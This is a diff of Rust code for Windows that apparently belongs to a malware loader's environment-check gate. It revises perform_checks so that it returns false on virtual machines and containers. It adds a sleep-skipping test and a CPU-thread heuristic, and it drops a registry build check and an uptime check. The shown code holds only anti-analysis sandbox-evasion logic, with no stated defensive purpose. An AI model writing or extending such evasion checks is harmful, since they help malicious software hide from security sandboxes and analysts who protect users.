@@ -5,8 +5,8 @@ use std::mem::zeroed;
 use std::net::ToSocketAddrs;
 use std::time::{SystemTime, UNIX_EPOCH};
 use std::process::Command;
-use winreg::enums::*;
-use winreg::RegKey;
+use std::{thread, time};
+
 
 extern "system" {
     fn RtlGetVersion(lpVersionInformation: *mut OSVERSIONINFOEXW) -> i32;
@@ -15,20 +15,13 @@ extern "system" {
 pub fn perform_checks() -> bool {
     let os_info = get_version_info();
 
+
     // Check OS version
     if os_info.dwMajorVersion != 10 {
         println!("Version ❌");
         return false;
     } else {
         println!("Version ✔️");
-    }
-
-    // Check if Windows version is 22H2
-    if get_win_build() {
-        println!("Windows version is 22H2 ✔️");
-    } else {
-        println!("Windows version is not 22H2 ❌");
-        return false;
     }
 
     // Check internet connectivity
@@ -40,10 +33,10 @@ pub fn perform_checks() -> bool {
     }
 
     // Check if machine is VM or container
-    if !check_virtual_machine() {
-        println!("Machine is physical ✔️");
+    if check_virtual_machine() {
+        println!("VM/Container ✔️");
     } else {
-        println!("Machine is a VM or container ❌");
+        println!("VM or Container detected ❌");
         return false;
     }
 
@@ -56,17 +49,17 @@ pub fn perform_checks() -> bool {
     }
 
     // Check uptime
-    if let Some(uptime) = get_uptime() {
-        if uptime > 3600 {
-            println!("Uptime: {} seconds ✔️", uptime);
-        } else {
-            println!("Uptime: {} seconds ❌ (Less than 1 hour)", uptime);
-            return false;
-        }
-    } else {
-        println!("Failed to get uptime ❌");
-        return false;
-    }
+    // if let Some(uptime) = get_uptime() {
+    //     if uptime > 3600 {
+    //         println!("Uptime: {} seconds ✔️", uptime);
+    //     } else {
+    //         println!("Uptime: {} seconds ❌ (Less than 1 hour)", uptime);
+    //         return false;
+    //     }
+    // } else {
+    //     println!("Failed to get uptime ❌");
+    //     return false;
+    // }
 
     true
 }
@@ -78,17 +71,6 @@ fn get_version_info() -> OSVERSIONINFOEXW {
         RtlGetVersion(&mut os_info);
         os_info
     }
-}
-
-// Search with win API maybe later
-fn get_win_build() -> bool {
-    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-    if let Ok(key) = hklm.open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion") {
-        if let Ok(build_lab) = key.get_value::<String>("BuildLabEx") {
-            return build_lab.contains("19045");
-        }
-    }
-    false
 }
 
 fn check_internet() -> bool {
@@ -104,10 +86,18 @@ fn check_virtual_machine() -> bool {
         .args(["computersystem", "get", "model"])
         .output();
 
+    if (get_num_threads() %2) !=0 {
+        return false
+    }
+
+    if !sleep_test() {
+        return false; 
+    }
+
     if let Ok(output) = cpuid {
         let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
         if output_str.contains("virtual") || output_str.contains("vmware") || output_str.contains("hyper-v") {
-            return true;
+            return false;
         }
     }
 
@@ -115,11 +105,11 @@ fn check_virtual_machine() -> bool {
         let mut contents = String::new();
         file.read_to_string(&mut contents).unwrap_or_default();
         if contents.contains("docker") || contents.contains("lxc") {
-            return true;
+            return false;
         }
     }
 
-    false
+    true
 }
 
 fn check_user_activity() -> bool {
@@ -137,17 +127,36 @@ fn check_user_activity() -> bool {
     false
 }
 
-fn get_uptime() -> Option<u64> {
-    if let Ok(duration) = SystemTime::now().duration_since(UNIX_EPOCH) {
-        let boot_time = Command::new("wmic")
-            .args(["os", "get", "LastBootUpTime"])
-            .output()
-            .ok()?;
+fn get_num_threads() -> usize {
+    let num_cpus = thread::available_parallelism()
+    .map(|n| n.get())
+    .unwrap_or(1); // Fallback to 1 in case of error
 
-        let output = String::from_utf8_lossy(&boot_time.stdout);
-        let boot_time_str = output.lines().nth(1)?.trim();
-        let boot_time_secs = boot_time_str.parse::<u64>().ok()?;
-        return Some(duration.as_secs() - boot_time_secs);
-    }
-    None
+    num_cpus
 }
+
+// Try to identify if the sleep is not skipped
+fn sleep_test() -> bool {
+    let duration = time::Duration::from_millis(3000);
+    let now = time::Instant::now();
+    thread::sleep(duration);
+    if now.elapsed() >= duration {
+        return true;
+    }
+    false
+}
+
+// fn get_uptime() -> Option<u64> {
+//     if let Ok(duration) = SystemTime::now().duration_since(UNIX_EPOCH) {
+//         let boot_time = Command::new("wmic")
+//             .args(["os", "get", "LastBootUpTime"])
+//             .output()
+//             .ok()?;
+
+//         let output = String::from_utf8_lossy(&boot_time.stdout);
+//         let boot_time_str = output.lines().nth(1)?.trim();
+//         let boot_time_secs = boot_time_str.parse::<u64>().ok()?;
+//         return Some(duration.as_secs() - boot_time_secs);
+//     }
+//     None
+// }
